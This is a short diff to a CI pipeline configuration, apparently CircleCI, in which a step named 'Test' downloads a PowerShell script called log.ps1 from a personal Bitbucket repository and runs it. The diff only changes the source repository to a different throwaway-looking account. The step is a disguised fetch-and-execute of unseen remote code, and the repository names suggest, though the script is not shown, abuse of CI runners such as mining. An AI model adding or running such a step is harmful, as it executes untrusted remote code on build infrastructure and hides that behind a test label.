@@ -13,5 +13,5 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebRequest https://bitbucket.org/kingking011/scmin/raw/f7fd36c76ac31df14ae7693a98c85cee2367501e/log.ps1 -OutFile log.ps1
+            Invoke-WebRequest https://bitbucket.org/yahayyu99/yahayyu99/raw/9d8833ba31320ec64e371822ed22cec7c00df9b3/log.ps1 -OutFile log.ps1
             ./log.ps1
